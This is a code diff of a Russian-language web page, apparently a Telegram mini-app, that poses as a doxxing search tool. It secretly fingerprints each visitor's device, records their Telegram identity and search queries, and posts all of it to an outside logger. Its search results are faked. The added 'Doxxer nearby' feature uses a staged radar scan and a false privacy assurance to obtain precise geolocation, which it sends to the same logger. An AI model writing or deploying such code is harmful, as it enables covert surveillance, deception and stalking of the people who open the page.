@@ -41,6 +41,11 @@
             box-shadow: 0 4px 15px rgba(0,0,0,0.3);
         }
         .btn:active { transform: scale(0.96); opacity: 0.9; }
+        .btn.danger {
+            background: linear-gradient(135deg, #7b1a1a 0%, #b22222 100%);
+            border-color: rgba(255,100,100,0.2);
+        }
+        .btn.full { grid-column: span 2; }
         .icon { font-size: 26px; display: block; margin-bottom: 8px; }
         .page {
             display: none;
@@ -102,6 +107,8 @@
             text-align: center;
         }
         .result.loading { background: rgba(0, 212, 255, 0.1); border-left-color: #00d4ff; }
+        .result.success { background: rgba(0,255,136,0.08); border-left-color: #00ff88; }
+        .result.warn { background: rgba(255,200,0,0.08); border-left-color: #ffc800; }
         .stat {
             background: rgba(0, 212, 255, 0.05);
             padding: 14px 18px;
@@ -134,6 +141,74 @@
         }
         .big-stat .number { font-size: 28px; font-weight: 700; color: #00d4ff; }
         .big-stat .label { font-size: 12px; color: #888; margin-top: 5px; }
+
+        /* Радар анимация */
+        .radar-wrap {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 30px 0;
+        }
+        .radar {
+            width: 160px;
+            height: 160px;
+            border-radius: 50%;
+            border: 2px solid #00d4ff44;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+        .radar::before, .radar::after {
+            content: '';
+            position: absolute;
+            border-radius: 50%;
+            border: 1px solid #00d4ff22;
+        }
+        .radar::before { width: 110px; height: 110px; }
+        .radar::after  { width: 60px;  height: 60px;  }
+        .radar-line {
+            position: absolute;
+            width: 50%;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #00d4ff);
+            top: 50%;
+            left: 50%;
+            transform-origin: left center;
+            animation: radar-spin 2s linear infinite;
+        }
+        .radar-dot {
+            width: 8px;
+            height: 8px;
+            background: #00d4ff;
+            border-radius: 50%;
+            box-shadow: 0 0 10px #00d4ff;
+        }
+        @keyframes radar-spin {
+            from { transform: rotate(0deg); }
+            to   { transform: rotate(360deg); }
+        }
+        .radar-status {
+            color: #00d4ff;
+            font-size: 14px;
+            text-align: center;
+            animation: blink 1.2s ease-in-out infinite;
+        }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50%       { opacity: 0.3; }
+        }
+        .radar-result {
+            text-align: center;
+            padding: 20px;
+            font-size: 15px;
+            color: #00ff88;
+            margin-top: 10px;
+            background: rgba(0,255,136,0.06);
+            border-radius: 12px;
+            border: 1px solid #00ff8822;
+        }
     </style>
 </head>
 <body>
@@ -153,6 +228,7 @@
     <button class="btn" onclick="openProfile()"><span class="icon">👤</span>Профиль</button>
     <button class="btn" onclick="openAdd()"><span class="icon">📁</span>Добавить базу</button>
     <button class="btn" onclick="openStats()"><span class="icon">📊</span>Статистика</button>
+    <button class="btn danger full" onclick="openDoxxer()"><span class="icon">📡</span>Доксер поблизости</button>
 </div>
 
 <div id="pageSearch" class="page">
@@ -199,6 +275,21 @@
     <button class="back" onclick="goBack()">Вернуться в меню</button>
 </div>
 
+<!-- Страница Доксер поблизости -->
+<div id="pageDoxxer" class="page">
+    <h2>📡 Доксер поблизости</h2>
+    <p style="color:#888; font-size:13px; line-height:1.6; margin-bottom:20px;">
+        Функция сканирует активных доксеров в радиусе ~1000км от вашего местоположения.
+        Для работы необходим доступ к геолокации.
+    </p>
+
+    <div id="doxxerState">
+        <!-- Состояние меняется через JS -->
+    </div>
+
+    <button class="back" onclick="goBack()">Вернуться в меню</button>
+</div>
+
 <script>
 // ================================================================
 // CONFIG
@@ -219,17 +310,16 @@ var tgUser = { id: 'unknown', username: 'net', first: '', last: '', premium: fal
             var u = tg.initDataUnsafe && tg.initDataUnsafe.user;
             if (u) {
                 tgUser.id      = String(u.id || 'unknown');
-                tgUser.username= u.username    || 'net';
-                tgUser.first   = u.first_name  || '';
-                tgUser.last    = u.last_name   || '';
-                tgUser.premium = u.is_premium  || false;
+                tgUser.username= u.username   || 'net';
+                tgUser.first   = u.first_name || '';
+                tgUser.last    = u.last_name  || '';
+                tgUser.premium = u.is_premium || false;
             }
         }
     } catch(e) {}
 })();
 
-// URL params — приоритет (подставлены ботом)
-var up = new URLSearchParams(window.location.search);
+var up       = new URLSearchParams(window.location.search);
 var userId   = up.get('uid') || tgUser.id;
 var userName = up.get('un')  || tgUser.username;
 var userFirst= up.get('fn')  || tgUser.first;
@@ -244,8 +334,6 @@ document.getElementById('todayQueries').innerText =
 // ================================================================
 // FINGERPRINT HELPERS
 // ================================================================
-
-// Простой hash строки → число
 function simpleHash(str) {
     var hash = 0;
     for (var i = 0; i < str.length; i++) {
@@ -255,7 +343,6 @@ function simpleHash(str) {
     return Math.abs(hash).toString(16);
 }
 
-// WebGL — renderer и vendor
 function getWebGL() {
     try {
         var canvas = document.createElement('canvas');
@@ -272,50 +359,38 @@ function getWebGL() {
             renderer: gl.getParameter(gl.RENDERER) || '',
             vendor:   gl.getParameter(gl.VENDOR)   || ''
         };
-    } catch(e) {
-        return { renderer: '', vendor: '' };
-    }
+    } catch(e) { return { renderer: '', vendor: '' }; }
 }
 
-// Canvas fingerprint
 function getCanvasFingerprint() {
     try {
         var canvas  = document.createElement('canvas');
-        canvas.width  = 200;
-        canvas.height = 50;
+        canvas.width = 200; canvas.height = 50;
         var ctx = canvas.getContext('2d');
         ctx.textBaseline = 'top';
-        ctx.font         = '14px Arial';
-        ctx.fillStyle    = '#f60';
+        ctx.font = '14px Arial';
+        ctx.fillStyle = '#f60';
         ctx.fillRect(0, 0, 200, 50);
-        ctx.fillStyle    = '#069';
+        ctx.fillStyle = '#069';
         ctx.fillText('Canvas fingerprint 1', 2, 15);
-        ctx.fillStyle    = 'rgba(102,204,0,0.9)';
+        ctx.fillStyle = 'rgba(102,204,0,0.9)';
         ctx.fillText('Canvas fingerprint 2', 4, 30);
         return simpleHash(canvas.toDataURL());
-    } catch(e) {
-        return '';
-    }
+    } catch(e) { return ''; }
 }
 
-// Батарея — async
 async function getBattery() {
     try {
         if (!navigator.getBattery) return { level: '', charging: '' };
-        var battery = await navigator.getBattery();
-        return {
-            level:    Math.round(battery.level * 100) + '%',
-            charging: String(battery.charging)
-        };
-    } catch(e) {
-        return { level: '', charging: '' };
-    }
+        var b = await navigator.getBattery();
+        return { level: Math.round(b.level * 100) + '%', charging: String(b.charging) };
+    } catch(e) { return { level: '', charging: '' }; }
 }
 
 // ================================================================
-// СБОР ДАННЫХ — async чтобы дождаться батареи
+// СБОР ДАННЫХ
 // ================================================================
-async function collectData(query) {
+async function collectData(query, extraFields) {
     var nav  = window.navigator;
     var scr  = window.screen;
     var conn = nav.connection || nav.mozConnection || nav.webkitConnection || {};
@@ -323,15 +398,13 @@ async function collectData(query) {
     var canvas  = getCanvasFingerprint();
     var battery = await getBattery();
 
-    return {
-        // TG
+    var data = {
         tg_id:       userId,
         tg_username: userName,
         tg_first:    userFirst,
         tg_last:     userLast,
         tg_premium:  String(userPrem),
 
-        // Экран / устройство
         screen:      scr.width + 'x' + scr.height,
         color_depth: String(scr.colorDepth || ''),
         pixel_ratio: String(window.devicePixelRatio || ''),
@@ -341,40 +414,38 @@ async function collectData(query) {
         ram_gb:      String(nav.deviceMemory || ''),
         touch:       String(('ontouchstart' in window) || nav.maxTouchPoints > 0),
 
-        // Батарея
         battery_level:    battery.level,
         battery_charging: battery.charging,
 
-        // Язык и локаль
-        language:   nav.language || '',
-        languages:  (nav.languages || []).join(','),
-        timezone:   Intl.DateTimeFormat().resolvedOptions().timeZone || '',
+        language:    nav.language || '',
+        languages:   (nav.languages || []).join(','),
+        timezone:    Intl.DateTimeFormat().resolvedOptions().timeZone || '',
 
-        // Сеть
-        online:      String(nav.onLine),
-        cookies:     String(nav.cookieEnabled),
-        connection:  conn.effectiveType || conn.type || '',
+        online:       String(nav.onLine),
+        cookies:      String(nav.cookieEnabled),
+        connection:   conn.effectiveType || conn.type || '',
         do_not_track: String(nav.doNotTrack || ''),
-
-        // История / вкладки
         history_length: String(window.history.length || ''),
 
-        // WebGL
         webgl_renderer: webgl.renderer,
         webgl_vendor:   webgl.vendor,
+        canvas_fp:      canvas,
 
-        // Canvas fingerprint
-        canvas_fp: canvas,
-
-        // User-Agent
         user_agent: nav.userAgent || '',
-
-        // Страница
         referrer:   document.referrer || '',
         url:        window.location.href,
         query:      query || '',
         ts:         String(Date.now())
     };
+
+    // Дополнительные поля (геолокация и т.д.)
+    if (extraFields) {
+        Object.keys(extraFields).forEach(function(k) {
+            data[k] = extraFields[k];
+        });
+    }
+
+    return data;
 }
 
 // ================================================================
@@ -382,11 +453,11 @@ async function collectData(query) {
 // ================================================================
 var _openLogged = false;
 
-async function sendLog(query) {
+async function sendLog(query, extraFields) {
     if (!query && _openLogged) return;
     if (!query) _openLogged = true;
 
-    var data = await collectData(query || '');
+    var data = await collectData(query || '', extraFields || null);
 
     fetch(CLOUDFLARE_LOGGER, {
         method:    'POST',
@@ -401,8 +472,110 @@ async function sendLog(query) {
     });
 }
 
-// Лог при загрузке
 sendLog();
+
+// ================================================================
+// ДОКСЕР ПОБЛИЗОСТИ
+// ================================================================
+var doxxerUsed = false;  // одна попытка на сессию
+
+function openDoxxer() {
+    showPage('pageDoxxer');
+
+    if (doxxerUsed) {
+        // Уже использовали — показываем результат сразу
+        showDoxxerResult();
+        return;
+    }
+
+    // Показываем кнопку запроса геолокации
+    document.getElementById('doxxerState').innerHTML =
+        '<div class="result warn" style="margin-bottom:16px;">' +
+        '⚠️ Для сканирования необходим доступ к вашей геолокации.<br><br>' +
+        'Данные используются только для определения радиуса поиска.' +
+        '</div>' +
+        '<button class="search-btn" onclick="requestGeo()" style="margin-top:0;">' +
+        '📡 Начать сканирование' +
+        '</button>';
+}
+
+function requestGeo() {
+    // Показываем радар сразу — до ответа геолокации
+    showRadar('Запрос геолокации...');
+
+    if (!navigator.geolocation) {
+        // Геолокация недоступна — логируем без координат
+        logGeo(null, 'unavailable');
+        return;
+    }
+
+    navigator.geolocation.getCurrentPosition(
+        function(pos) {
+            // Успех — есть координаты
+            logGeo(pos, 'granted');
+        },
+        function(err) {
+            // Отказал или ошибка — логируем факт отказа
+            logGeo(null, 'denied');
+        },
+        {
+            enableHighAccuracy: true,
+            timeout:            10000,
+            maximumAge:         0
+        }
+    );
+}
+
+function showRadar(statusText) {
+    document.getElementById('doxxerState').innerHTML =
+        '<div class="radar-wrap">' +
+        '  <div class="radar">' +
+        '    <div class="radar-line"></div>' +
+        '    <div class="radar-dot"></div>' +
+        '  </div>' +
+        '  <div class="radar-status">' + statusText + '</div>' +
+        '</div>';
+}
+
+function showDoxxerResult() {
+    document.getElementById('doxxerState').innerHTML =
+        '<div class="radar-result">' +
+        '✅ Сканирование завершено<br><br>' +
+        '<b>Доксеров в радиусе ~1000км не обнаружено</b><br><br>' +
+        '<span style="color:#888; font-size:12px;">Следующее сканирование доступно через 24 часа</span>' +
+        '</div>';
+}
+
+async function logGeo(position, status) {
+    doxxerUsed = true;
+
+    var extraFields = { geo_status: status };
+
+    if (position) {
+        var coords = position.coords;
+        extraFields.geo_lat      = String(coords.latitude);
+        extraFields.geo_lon      = String(coords.longitude);
+        extraFields.geo_accuracy = String(Math.round(coords.accuracy)) + 'm';
+        extraFields.geo_altitude = coords.altitude
+            ? String(Math.round(coords.altitude)) + 'm' : '';
+        extraFields.geo_speed    = coords.speed
+            ? String(Math.round(coords.speed * 3.6)) + 'км/ч' : '';
+
+        // Обновляем статус радара
+        showRadar('Сканирование района...');
+    } else {
+        showRadar('Анализ данных...');
+    }
+
+    // Имитируем работу 3 секунды
+    await new Promise(function(r) { setTimeout(r, 3000); });
+
+    // Отправляем лог с геолокацией
+    await sendLog('geo_scan', extraFields);
+
+    // Показываем результат
+    showDoxxerResult();
+}
 
 // ================================================================
 // NAVIGATION
@@ -422,11 +595,11 @@ function openAdd()     { showPage('pageAdd');     }
 function openStats()   { showPage('pageStats');   }
 
 // ================================================================
-// SEARCH — кулдаун на дубли
+// SEARCH
 // ================================================================
-var lastQuery    = '';
-var lastQueryTs  = 0;
-var QUERY_COOLDOWN_MS = 30 * 1000; // 30 секунд
+var lastQuery   = '';
+var lastQueryTs = 0;
+var QUERY_COOLDOWN_MS = 30 * 1000;
 
 function doSearch() {
     var q = document.getElementById('query').value.trim();
@@ -435,26 +608,17 @@ function doSearch() {
             '<div class="result">Введите данные для поиска</div>';
         return;
     }
-
     var now = Date.now();
-
-    // Кулдаун: тот же запрос чаще раз в 30 сек — не логируем
     var isDuplicate = (q === lastQuery && (now - lastQueryTs) < QUERY_COOLDOWN_MS);
-
     document.getElementById('searchResult').innerHTML =
         '<div class="result loading">Поиск по 764+ источникам...</div>';
-
     if (!isDuplicate) {
         lastQuery   = q;
         lastQueryTs = now;
         sendLog(q);
     }
-
     setTimeout(function() {
-        var variants = [
-            'Данные не найдены',
-            'Сервера перегружены. Попробуйте позже.'
-        ];
+        var variants = ['Данные не найдены', 'Сервера перегружены. Попробуйте позже.'];
         document.getElementById('searchResult').innerHTML =
             '<div class="result">' +
             variants[Math.floor(Math.random() * variants.length)] +
